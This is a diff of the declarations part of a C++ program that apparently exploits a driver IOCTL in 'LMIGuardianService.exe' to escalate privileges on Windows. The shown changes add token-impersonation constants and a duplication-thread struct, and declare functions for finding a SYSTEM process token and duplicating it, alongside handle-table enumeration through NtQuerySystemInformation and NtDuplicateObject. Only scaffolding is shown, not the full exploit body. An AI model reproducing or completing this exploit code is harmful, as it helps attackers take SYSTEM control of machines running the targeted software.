@@ -6,7 +6,8 @@
 #include <TlHelp32.h>
 #pragma comment(lib, "ntdll")
 
-
+#define OBJECT_TYPE_THREAD_TOKEN 5
+#define THREAD_TOKEN_IMPERSONATE_PRIVILEGES 0xe
 #define IOCTL_DUPE_LEL 0x9211001C
 #define SystemHandleInformation 16
 #define OBJECT_TYPE_PROCESS 7
@@ -19,6 +20,10 @@ typedef struct LMI_INFO {
 	DWORD64 reserved1;
 } LMI_INFO, * PLMI_INFO;
 
+typedef struct _DUPE_THREAD_INFO {
+	HANDLE hDevice;
+	BOOL Run;
+}DUPE_THREAD_INFO, *PDUPE_THREAD_INFO;
 
 typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
 {
@@ -38,12 +43,6 @@ typedef struct _SYSTEM_HANDLE_INFORMATION
 	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
 } SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
 
-typedef struct SHITTY_THREAD_INFO {
-	BOOL bStart;
-	DWORD64 hBegin;
-	HANDLE hTarget;
-}SHITTY_THREAD_INFO, *PSHITTY_THREAD_INFO;
-
 static_assert(sizeof(LMI_INFO) == 0x20, "must be 0x20 bytes");
 
 typedef NTSTATUS(WINAPI* lpNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
@@ -55,8 +54,6 @@ static lpNtQueryInformationProcess g_NtQueryInformationProcess = NULL;
 static lpNtDuplicateObject g_NtDuplicateObject = NULL;
 static lpNtQueryObject g_NtQueryObject = NULL;
 static lpNtQuerySystemInformation g_NtQuerySystemInformation = NULL;
-
-
 static HANDLE g_hCurrentProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
 static const SIZE_T szNumThreads = 2;
 static const char* g_strTargetProcName = "LMIGuardianService.exe";
@@ -64,4 +61,6 @@ static const SIZE_T g_strLenTargetProc = strlen(g_strTargetProcName);
 
 std::vector<HANDLE> QuerySystemHandlesForObjectTypeAndAccess(DWORD dwObjectType, DWORD dwAccessMask);
 VOID HandleSearchThread(LPVOID lpParam);
+HANDLE FindSystemPidFirstToken();
+NTSTATUS DupeThread(LPVOID lpParam);
 HANDLE FindNextCreatedHandle();
